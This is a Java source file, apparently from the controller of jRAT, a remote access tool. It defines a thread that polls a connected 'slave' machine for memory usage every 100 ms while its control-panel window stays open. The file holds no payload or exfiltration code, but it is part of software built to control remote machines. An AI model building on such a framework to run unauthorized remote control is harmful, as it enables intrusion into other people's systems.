package io.jrat.controller.threads;

import io.jrat.controller.Slave;
import io.jrat.controller.packets.outgoing.Packet33UsedMemory;
import io.jrat.controller.ui.frames.FrameControlPanel;
import io.jrat.controller.ui.panels.PanelMemoryUsage;

public class ThreadMemoryUsage extends Thread {

	public Slave slave;

	public ThreadMemoryUsage(Slave slave) {
		super("Memory usage update thread");
		this.slave = slave;
	}

	public void run() {
		while (true) {
			FrameControlPanel frame = FrameControlPanel.instances.get(slave);
			
			if (frame != null) {
				PanelMemoryUsage panel = (PanelMemoryUsage) frame.panels.get("memory usage");

				if (panel.shouldSend()) {
					slave.addToSendQueue(new Packet33UsedMemory());
				} else {
					break;
				}
				
				try {
					Thread.sleep(100L);
				} catch (Exception e) {
					e.printStackTrace();
				}
			} else {
				break;
			}
		}
	}

}
